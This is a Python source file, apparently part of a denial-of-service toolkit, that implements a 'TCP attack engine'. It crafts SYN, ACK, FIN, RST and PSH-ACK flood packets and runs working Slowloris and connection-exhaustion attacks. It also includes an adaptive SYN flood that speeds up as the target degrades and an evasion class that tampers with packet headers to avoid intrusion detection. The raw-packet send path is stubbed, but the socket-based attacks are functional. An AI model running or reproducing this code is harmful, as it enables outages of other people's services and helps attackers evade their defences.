#!/usr/bin/env python3
"""
TCP Engine - High-performance TCP attack implementation
Provides optimized TCP-based attack vectors with advanced evasion techniques
"""

import asyncio
import logging
import socket
import time
import random
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
import struct

try:
    from scapy.layers.inet import IP, TCP
    from scapy.volatile import RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logging.warning("Scapy not available, TCP engine will use limited functionality")

from .socket_factory import SocketFactory, SocketType

logger = logging.getLogger(__name__)

class TCPAttackType(Enum):
    SYN_FLOOD = "syn_flood"
    ACK_FLOOD = "ack_flood"
    FIN_FLOOD = "fin_flood"
    RST_FLOOD = "rst_flood"
    PUSH_ACK_FLOOD = "push_ack_flood"
    SLOWLORIS = "slowloris"
    CONNECTION_EXHAUSTION = "connection_exhaustion"


@dataclass
class TCPAttackConfig:
    """Configuration for TCP attacks"""
    target: str = "127.0.0.1"
    port: int = 80
    enable_spoofing: bool = False
    spoofing_rate: float = 0.3
    max_connections: int = 1000
    connection_timeout: float = 10.0
    packet_size: int = 1460
    attack_type: TCPAttackType = TCPAttackType.SYN_FLOOD


@dataclass
class TCPPacketOptions:
    """TCP packet options for evasion"""
    window_size: int = 65535
    mss: int = 1460
    window_scale: int = 7
    timestamp: bool = True
    sack_permitted: bool = True
    nop_padding: bool = True

class TCPEngine:
    """High-performance TCP attack engine"""
    
    def __init__(self, config: TCPAttackConfig = None):
        self.config = config or TCPAttackConfig()
        self.socket_factory = SocketFactory()
        self.active_connections = {}
        self.packet_cache = {}
        self.stats = {
            'packets_sent': 0,
            'connections_made': 0,
            'errors': 0
        }
        
        logger.info("TCP Engine initialized")
    
    async def initialize(self):
        """Initialize TCP engine"""
        try:
            await self.socket_factory.initialize()
            
            if not SCAPY_AVAILABLE:
                logger.warning("TCP engine running with limited functionality (no Scapy)")
            
            logger.info("TCP Engine initialization completed")
            
        except Exception as e:
            logger.error(f"TCP Engine initialization failed: {e}")
            raise
    
    async def create_packet(self, target: str, port: int, packet_size: int, 
                          attack_type: TCPAttackType = TCPAttackType.SYN_FLOOD,
                          options: Optional[TCPPacketOptions] = None) -> bytes:
        """Create optimized TCP packet"""
        try:
            if not SCAPY_AVAILABLE:
                return await self._create_simple_packet(target, port, packet_size, attack_type)
            
            return await self._create_scapy_packet(target, port, packet_size, attack_type, options)
            
        except Exception as e:
            logger.error(f"TCP packet creation failed: {e}")
            self.stats['errors'] += 1
            raise
    
    async def _create_simple_packet(self, target: str, port: int, packet_size: int,
                                  attack_type: TCPAttackType) -> bytes:
        """Create simple TCP packet without Scapy"""
        # Simple TCP header construction
        src_port = random.randint(1024, 65535)
        seq_num = random.randint(0, 2**32 - 1)
        ack_num = 0
        
        # TCP flags based on attack type
        flags = 0
        if attack_type == TCPAttackType.SYN_FLOOD:
            flags = 0x02  # SYN
        elif attack_type == TCPAttackType.ACK_FLOOD:
            flags = 0x10  # ACK
            ack_num = random.randint(0, 2**32 - 1)
        elif attack_type == TCPAttackType.FIN_FLOOD:
            flags = 0x01  # FIN
        elif attack_type == TCPAttackType.RST_FLOOD:
            flags = 0x04  # RST
        elif attack_type == TCPAttackType.PUSH_ACK_FLOOD:
            flags = 0x18  # PSH + ACK
            ack_num = random.randint(0, 2**32 - 1)
        
        # Build TCP header (simplified)
        tcp_header = struct.pack(
            '!HHLLBBHHH',
            src_port,      # Source port
            port,          # Destination port
            seq_num,       # Sequence number
            ack_num,       # Acknowledgment number
            (5 << 4),      # Data offset (5 * 4 = 20 bytes)
            flags,         # Flags
            65535,         # Window size
            0,             # Checksum (will be calculated by kernel)
            0              # Urgent pointer
        )
        
        # Add payload if needed
        payload = b'A' * max(0, packet_size - len(tcp_header))
        
        return tcp_header + payload
    
    async def _create_scapy_packet(self, target: str, port: int, packet_size: int,
                                 attack_type: TCPAttackType, 
                                 options: Optional[TCPPacketOptions] = None) -> bytes:
        """Create TCP packet using Scapy"""
        if options is None:
            options = TCPPacketOptions()
        
        # Create IP layer
        ip_layer = IP(dst=target)
        
        # Create TCP layer based on attack type
        tcp_options = self._build_tcp_options(options)
        
        if attack_type == TCPAttackType.SYN_FLOOD:
            tcp_layer = TCP(
                sport=RandShort(),
                dport=port,
                flags="S",
                window=options.window_size,
                options=tcp_options
            )
        elif attack_type == TCPAttackType.ACK_FLOOD:
            tcp_layer = TCP(
                sport=RandShort(),
                dport=port,
                flags="A",
                seq=random.randint(0, 2**32 - 1),
                ack=random.randint(0, 2**32 - 1),
                window=options.window_size,
                options=tcp_options
            )
        elif attack_type == TCPAttackType.FIN_FLOOD:
            tcp_layer = TCP(
                sport=RandShort(),
                dport=port,
                flags="F",
                seq=random.randint(0, 2**32 - 1),
                window=options.window_size,
                options=tcp_options
            )
        elif attack_type == TCPAttackType.RST_FLOOD:
            tcp_layer = TCP(
                sport=RandShort(),
                dport=port,
                flags="R",
                seq=random.randint(0, 2**32 - 1),
                window=0
            )
        elif attack_type == TCPAttackType.PUSH_ACK_FLOOD:
            tcp_layer = TCP(
                sport=RandShort(),
                dport=port,
                flags="PA",
                seq=random.randint(0, 2**32 - 1),
                ack=random.randint(0, 2**32 - 1),
                window=options.window_size,
                options=tcp_options
            )
        else:
            tcp_layer = TCP(sport=RandShort(), dport=port, flags="S")
        
        # Create packet
        packet = ip_layer / tcp_layer
        
        # Add payload if needed
        current_size = len(bytes(packet))
        if packet_size > current_size:
            payload = b'A' * (packet_size - current_size)
            packet = packet / payload
        
        return bytes(packet)
    
    def _build_tcp_options(self, options: TCPPacketOptions) -> List[Tuple]:
        """Build TCP options for evasion"""
        tcp_options = []
        
        # MSS option
        tcp_options.append(('MSS', options.mss))
        
        # Window scale option
        tcp_options.append(('WScale', options.window_scale))
        
        # SACK permitted
        if options.sack_permitted:
            tcp_options.append(('SAckOK', ''))
        
        # Timestamp
        if options.timestamp:
            timestamp = int(time.time() * 1000) % (2**32)
            tcp_options.append(('Timestamp', (timestamp, 0)))
        
        # NOP padding for evasion
        if options.nop_padding:
            tcp_options.append(('NOP', None))
            tcp_options.append(('NOP', None))
        
        return tcp_options
    
    async def syn_flood(self, target: str, port: int, duration: int = 0,
                       packet_size: int = 64, rate_limit: int = 1000) -> Dict[str, Any]:
        """Execute SYN flood attack"""
        logger.info(f"Starting SYN flood against {target}:{port}")
        
        start_time = time.time()
        packets_sent = 0
        
        try:
            while True:
                # Check duration
                if duration > 0 and (time.time() - start_time) >= duration:
                    break
                
                # Create and send SYN packet
                packet = await self.create_packet(
                    target, port, packet_size, TCPAttackType.SYN_FLOOD
                )
                
                # Note: Actual packet sending requires raw sockets (root privileges)
                # This would need to be implemented with real raw socket sending
                logger.debug(f"TCP packet prepared for {target}:{port}, size: {len(packet)} (raw socket sending not implemented)")
                
                packets_sent += 1
                self.stats['packets_sent'] += 1
                
                # Rate limiting
                if packets_sent % rate_limit == 0:
                    await asyncio.sleep(0.001)
            
            return {
                'attack_type': 'SYN_FLOOD',
                'target': target,
                'port': port,
                'packets_sent': packets_sent,
                'duration': time.time() - start_time,
                'success': True
            }
            
        except Exception as e:
            logger.error(f"SYN flood failed: {e}")
            self.stats['errors'] += 1
            return {
                'attack_type': 'SYN_FLOOD',
                'success': False,
                'error': str(e),
                'packets_sent': packets_sent
            }
    
    async def slowloris(self, target: str, port: int, duration: int = 60,
                       connections: int = 200) -> Dict[str, Any]:
        """Execute Slowloris attack"""
        logger.info(f"Starting Slowloris against {target}:{port}")
        
        start_time = time.time()
        active_connections = []
        
        try:
            # Create initial connections
            for i in range(connections):
                try:
                    sock = self.socket_factory.create_socket(SocketType.TCP)
                    await asyncio.get_event_loop().sock_connect(sock, (target, port))
                    
                    # Send partial HTTP request
                    request = f"GET / HTTP/1.1\r\nHost: {target}\r\n"
                    await asyncio.get_event_loop().sock_sendall(sock, request.encode())
                    
                    active_connections.append(sock)
                    self.stats['connections_made'] += 1
                    
                except Exception as e:
                    logger.debug(f"Connection {i} failed: {e}")
                    self.stats['errors'] += 1
            
            # Maintain connections
            while (time.time() - start_time) < duration:
                for sock in active_connections[:]:
                    try:
                        # Send keep-alive header
                        header = f"X-a: {random.randint(1, 5000)}\r\n"
                        await asyncio.get_event_loop().sock_sendall(sock, header.encode())
                        
                    except Exception:
                        # Connection lost, remove from list
                        active_connections.remove(sock)
                        try:
                            sock.close()
                        except:
                            pass
                
                await asyncio.sleep(10)  # Send keep-alive every 10 seconds
            
            # Clean up connections
            for sock in active_connections:
                try:
                    sock.close()
                except:
                    pass
            
            return {
                'attack_type': 'SLOWLORIS',
                'target': target,
                'port': port,
                'max_connections': len(active_connections),
                'duration': time.time() - start_time,
                'success': True
            }
            
        except Exception as e:
            logger.error(f"Slowloris attack failed: {e}")
            self.stats['errors'] += 1
            return {
                'attack_type': 'SLOWLORIS',
                'success': False,
                'error': str(e)
            }
    
    async def connection_exhaustion(self, target: str, port: int, 
                                 max_connections: int = 1000) -> Dict[str, Any]:
        """Execute connection exhaustion attack"""
        logger.info(f"Starting connection exhaustion against {target}:{port}")
        
        connections = []
        successful_connections = 0
        
        try:
            for i in range(max_connections):
                try:
                    sock = self.socket_factory.create_socket(SocketType.TCP)
                    await asyncio.get_event_loop().sock_connect(sock, (target, port))
                    
                    connections.append(sock)
                    successful_connections += 1
                    self.stats['connections_made'] += 1
                    
                    # Small delay to avoid overwhelming
                    if i % 100 == 0:
                        await asyncio.sleep(0.1)
                        
                except Exception as e:
                    logger.debug(f"Connection {i} failed: {e}")
                    self.stats['errors'] += 1
                    break
            
            # Hold connections for a while
            await asyncio.sleep(30)
            
            # Clean up
            for sock in connections:
                try:
                    sock.close()
                except:
                    pass
            
            return {
                'attack_type': 'CONNECTION_EXHAUSTION',
                'target': target,
                'port': port,
                'successful_connections': successful_connections,
                'success': True
            }
            
        except Exception as e:
            logger.error(f"Connection exhaustion failed: {e}")
            self.stats['errors'] += 1
            return {
                'attack_type': 'CONNECTION_EXHAUSTION',
                'success': False,
                'error': str(e)
            }
    
    # Removed _simulate_packet_send method - no simulations allowed
    # For real raw packet sending, use the RealTCPGenerator in core/protocols/real_tcp.py
    
    async def get_status(self) -> Dict[str, Any]:
        """Get TCP engine status"""
        return {
            'initialized': True,
            'scapy_available': SCAPY_AVAILABLE,
            'active_connections': len(self.active_connections),
            'stats': self.stats.copy()
        }
    
    def get_supported_attacks(self) -> List[str]:
        """Get list of supported attack types"""
        return [attack.value for attack in TCPAttackType]
    
    async def execute_attack(self, attack_type: str, target: str, port: int,
                           **kwargs) -> Dict[str, Any]:
        """Execute specified TCP attack"""
        try:
            attack_enum = TCPAttackType(attack_type.lower())
            
            if attack_enum == TCPAttackType.SYN_FLOOD:
                return await self.syn_flood(target, port, **kwargs)
            elif attack_enum == TCPAttackType.SLOWLORIS:
                return await self.slowloris(target, port, **kwargs)
            elif attack_enum == TCPAttackType.CONNECTION_EXHAUSTION:
                return await self.connection_exhaustion(target, port, **kwargs)
            else:
                return {
                    'success': False,
                    'error': f"Attack type {attack_type} not implemented"
                }
                
        except ValueError:
            return {
                'success': False,
                'error': f"Unknown attack type: {attack_type}"
            }
        except Exception as e:
            logger.error(f"Attack execution failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }



class AdvancedTCPEngine(TCPEngine):
    """
    Advanced TCP engine with sophisticated attack techniques.
    
    Features:
    - TCP state machine manipulation
    - Connection state tracking
    - Adaptive timing based on target response
    - Protocol-level evasion techniques
    """
    
    def __init__(self, config: TCPAttackConfig = None):
        super().__init__(config)
        self.connection_states = {}
        self.timing_model = AdaptiveTiming()
        self.evasion_engine = TCPEvasionEngine()
        
    async def tcp_state_manipulation(self, target: str, port: int, 
                                     manipulation_type: str = "half_open") -> Dict[str, Any]:
        """
        Manipulate TCP state machine to exhaust server resources.
        
        Types:
        - half_open: Leave connections in SYN_RECEIVED state
        - time_wait: Force connections into TIME_WAIT state
        - fin_wait: Leave connections in FIN_WAIT state
        """
        logger.info(f"Starting TCP state manipulation ({manipulation_type}) against {target}:{port}")
        
        results = {
            'manipulation_type': manipulation_type,
            'connections_created': 0,
            'connections_in_target_state': 0,
            'errors': 0
        }
        
        try:
            if manipulation_type == "half_open":
                # Send SYN packets without completing handshake
                for _ in range(self.config.max_connections):
                    packet = await self.create_packet(target, port, 64, TCPAttackType.SYN_FLOOD)
                    results['connections_created'] += 1
                    await asyncio.sleep(0.001)
                    
            elif manipulation_type == "time_wait":
                # Complete handshake then immediately close
                for _ in range(min(100, self.config.max_connections)):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)
                        sock.connect((target, port))
                        sock.close()
                        results['connections_created'] += 1
                        results['connections_in_target_state'] += 1
                    except Exception:
                        results['errors'] += 1
                    await asyncio.sleep(0.01)
                    
            elif manipulation_type == "fin_wait":
                # Send FIN without proper close sequence
                for _ in range(min(100, self.config.max_connections)):
                    packet = await self.create_packet(target, port, 64, TCPAttackType.FIN_FLOOD)
                    results['connections_created'] += 1
                    await asyncio.sleep(0.001)
            
            return results
            
        except Exception as e:
            logger.error(f"TCP state manipulation failed: {e}")
            results['error'] = str(e)
            return results
    
    async def adaptive_syn_flood(self, target: str, port: int, duration: int = 60) -> Dict[str, Any]:
        """
        Adaptive SYN flood that adjusts rate based on target response.
        """
        logger.info(f"Starting adaptive SYN flood against {target}:{port}")
        
        start_time = time.time()
        current_rate = 1000  # Start with 1000 PPS
        max_rate = 100000
        min_rate = 100
        
        results = {
            'packets_sent': 0,
            'rate_adjustments': 0,
            'peak_rate': 0,
            'errors': 0
        }
        
        while (time.time() - start_time) < duration:
            # Send burst at current rate
            burst_start = time.time()
            burst_packets = 0
            
            while burst_packets < current_rate and (time.time() - burst_start) < 1.0:
                try:
                    packet = await self.create_packet(target, port, 64, TCPAttackType.SYN_FLOOD)
                    results['packets_sent'] += 1
                    burst_packets += 1
                except Exception:
                    results['errors'] += 1
            
            # Measure target response (simplified - check if we can still connect)
            response_time = await self._measure_response_time(target, port)
            
            # Adjust rate based on response
            if response_time > 2.0:  # Target is struggling
                # Maintain or slightly increase rate
                current_rate = min(max_rate, int(current_rate * 1.1))
            elif response_time < 0.1:  # Target handling well
                # Increase rate significantly
                current_rate = min(max_rate, int(current_rate * 1.5))
            else:
                # Moderate adjustment
                current_rate = min(max_rate, int(current_rate * 1.2))
            
            results['rate_adjustments'] += 1
            results['peak_rate'] = max(results['peak_rate'], current_rate)
            
            # Brief pause between bursts
            await asyncio.sleep(0.1)
        
        results['duration'] = time.time() - start_time
        results['average_pps'] = results['packets_sent'] / results['duration']
        
        return results
    
    async def _measure_response_time(self, target: str, port: int) -> float:
        """Measure target response time"""
        try:
            start = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
            sock.close()
            return time.time() - start
        except socket.timeout:
            return 5.0
        except Exception:
            return 10.0


class AdaptiveTiming:
    """Adaptive timing model for TCP attacks"""
    
    def __init__(self):
        self.response_times = []
        self.current_delay = 0.001  # 1ms default
        self.min_delay = 0.0001  # 100μs
        self.max_delay = 0.1  # 100ms
        
    def record_response(self, response_time: float):
        """Record a response time measurement"""
        self.response_times.append(response_time)
        if len(self.response_times) > 100:
            self.response_times.pop(0)
        self._adjust_timing()
    
    def _adjust_timing(self):
        """Adjust timing based on response patterns"""
        if len(self.response_times) < 10:
            return
        
        avg_response = sum(self.response_times[-10:]) / 10
        
        if avg_response > 1.0:
            # Target is slow, reduce our rate
            self.current_delay = min(self.max_delay, self.current_delay * 1.5)
        elif avg_response < 0.1:
            # Target is fast, increase our rate
            self.current_delay = max(self.min_delay, self.current_delay * 0.7)
    
    def get_delay(self) -> float:
        """Get current recommended delay"""
        # Add jitter for evasion
        jitter = random.uniform(0.8, 1.2)
        return self.current_delay * jitter


class TCPEvasionEngine:
    """TCP-level evasion techniques"""
    
    def __init__(self):
        self.techniques = [
            'fragmentation',
            'overlapping_fragments',
            'ttl_manipulation',
            'urgent_pointer',
            'reserved_bits',
            'window_manipulation'
        ]
        
    def apply_evasion(self, packet: bytes, technique: str) -> bytes:
        """Apply evasion technique to packet"""
        if technique == 'ttl_manipulation':
            return self._manipulate_ttl(packet)
        elif technique == 'urgent_pointer':
            return self._set_urgent_pointer(packet)
        elif technique == 'reserved_bits':
            return self._set_reserved_bits(packet)
        elif technique == 'window_manipulation':
            return self._manipulate_window(packet)
        return packet
    
    def _manipulate_ttl(self, packet: bytes) -> bytes:
        """Manipulate TTL to evade some IDS"""
        if len(packet) < 20:
            return packet
        packet = bytearray(packet)
        # Set TTL to random value between 64 and 128
        packet[8] = random.randint(64, 128)
        return bytes(packet)
    
    def _set_urgent_pointer(self, packet: bytes) -> bytes:
        """Set urgent pointer for evasion"""
        if len(packet) < 40:  # Need IP + TCP headers
            return packet
        packet = bytearray(packet)
        # Set URG flag and urgent pointer
        ip_header_len = (packet[0] & 0x0F) * 4
        tcp_offset = ip_header_len
        if tcp_offset + 20 <= len(packet):
            packet[tcp_offset + 13] |= 0x20  # Set URG flag
            # Set urgent pointer to random value
            urgent_ptr = random.randint(1, 100)
            packet[tcp_offset + 18] = (urgent_ptr >> 8) & 0xFF
            packet[tcp_offset + 19] = urgent_ptr & 0xFF
        return bytes(packet)
    
    def _set_reserved_bits(self, packet: bytes) -> bytes:
        """Set reserved bits (may confuse some parsers)"""
        if len(packet) < 40:
            return packet
        packet = bytearray(packet)
        ip_header_len = (packet[0] & 0x0F) * 4
        tcp_offset = ip_header_len
        if tcp_offset + 13 <= len(packet):
            # Set reserved bits in TCP header
            packet[tcp_offset + 12] |= 0x0E  # Set reserved bits
        return bytes(packet)
    
    def _manipulate_window(self, packet: bytes) -> bytes:
        """Manipulate TCP window size"""
        if len(packet) < 40:
            return packet
        packet = bytearray(packet)
        ip_header_len = (packet[0] & 0x0F) * 4
        tcp_offset = ip_header_len
        if tcp_offset + 16 <= len(packet):
            # Set window to random value
            window = random.randint(1024, 65535)
            packet[tcp_offset + 14] = (window >> 8) & 0xFF
            packet[tcp_offset + 15] = window & 0xFF
        return bytes(packet)
    
    def get_random_technique(self) -> str:
        """Get a random evasion technique"""
        return random.choice(self.techniques)


class TCPConnectionPool:
    """
    Connection pool for efficient TCP connection management.
    
    Features:
    - Connection reuse
    - Health checking
    - Automatic reconnection
    """
    
    def __init__(self, target: str, port: int, max_connections: int = 100):
        self.target = target
        self.port = port
        self.max_connections = max_connections
        self.connections = []
        self.available = []
        self.lock = asyncio.Lock()
        
    async def get_connection(self) -> Optional[socket.socket]:
        """Get a connection from the pool"""
        async with self.lock:
            if self.available:
                conn = self.available.pop()
                if self._is_healthy(conn):
                    return conn
                else:
                    try:
                        conn.close()
                    except:
                        pass
            
            # Create new connection if pool not full
            if len(self.connections) < self.max_connections:
                conn = await self._create_connection()
                if conn:
                    self.connections.append(conn)
                    return conn
            
            return None
    
    async def release_connection(self, conn: socket.socket):
        """Return a connection to the pool"""
        async with self.lock:
            if self._is_healthy(conn):
                self.available.append(conn)
            else:
                try:
                    conn.close()
                except:
                    pass
                if conn in self.connections:
                    self.connections.remove(conn)
    
    async def _create_connection(self) -> Optional[socket.socket]:
        """Create a new connection"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.connect((self.target, self.port))
            return sock
        except Exception as e:
            logger.debug(f"Failed to create connection: {e}")
            return None
    
    def _is_healthy(self, conn: socket.socket) -> bool:
        """Check if connection is still healthy"""
        try:
            # Try to peek at data without consuming it
            conn.setblocking(False)
            try:
                data = conn.recv(1, socket.MSG_PEEK)
                conn.setblocking(True)
                return True
            except BlockingIOError:
                conn.setblocking(True)
                return True  # No data available but connection is alive
            except:
                return False
        except:
            return False
    
    async def close_all(self):
        """Close all connections"""
        async with self.lock:
            for conn in self.connections:
                try:
                    conn.close()
                except:
                    pass
            self.connections.clear()
            self.available.clear()
